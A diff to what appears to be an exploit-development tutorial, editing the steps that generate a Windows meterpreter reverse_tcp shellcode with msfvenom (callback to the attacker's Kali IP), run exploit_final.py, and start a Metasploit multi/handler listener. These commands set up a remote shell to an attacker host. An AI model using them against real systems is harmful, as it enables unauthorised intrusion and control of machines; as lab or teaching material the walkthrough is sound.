@@ -130,7 +130,7 @@ TIME TO WRITE THE FINAL EXPLOIT !!
 
 We need our payload , get it with this 
 ```sh
-msfvenom -p windows/meterpreter/reverse_tcp lhost=<windows_ip> lport=4444 -e x86/shikata_ga_nai -b "\x00" -f c
+msfvenom -p windows/meterpreter/reverse_tcp lhost=<kali_ip> lport=4444 -e x86/shikata_ga_nai -b "\x00" -f c
 ```
 
 Paste the payload in script as per `exploit_final.py`
@@ -144,11 +144,12 @@ Do all these steps
 ```sh
 python2 exploit_final.py
 ```
+Run Pyhton file in 2nd terminal
 ```sh
 msfconsole
 ```
 ```sh
-use/exploit/multi/handler
+use exploit/multi/handler
 ```
 ```sh
 set payload windows/meterpreter/reverse_tcp
